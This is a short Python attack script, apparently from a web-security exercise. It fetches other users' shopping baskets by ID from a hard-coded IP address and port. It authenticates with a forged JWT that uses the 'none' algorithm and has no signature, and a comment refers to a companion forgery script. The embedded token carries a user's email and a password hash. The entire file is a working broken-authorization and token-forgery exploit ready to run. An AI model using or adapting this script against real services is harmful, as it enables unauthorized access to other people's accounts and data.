import requests

# The ID number of the basket you want
id = 78

# Copy any user's current token here or generate one with "JWT None Alg Attack.py"
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiJCdW1ibGViZWVNYW5Aa3dpa2UubWFydCIsInBhc3N3b3JkIjoiN2M2YTE4MGIzNjg5NmEwYThjMDI3ODdlZWFmYjBlNGMiLCJjcmVhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oiLCJ1cGRhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oifSwiaWF0IjoxNTMwNzU4OTA3LCJleHAiOjE1MzA3NzY5MDd9."

r = requests.get(
    "http://43.241.202.47:3003/rest/basket/" + str(id),
    headers=({'Authorization': "Bearer " + token}))

print(r.status_code)
if r.status_code == 200:
    print("Basket:", r.text)
else:
    print("Failed to load basket with id:", id)
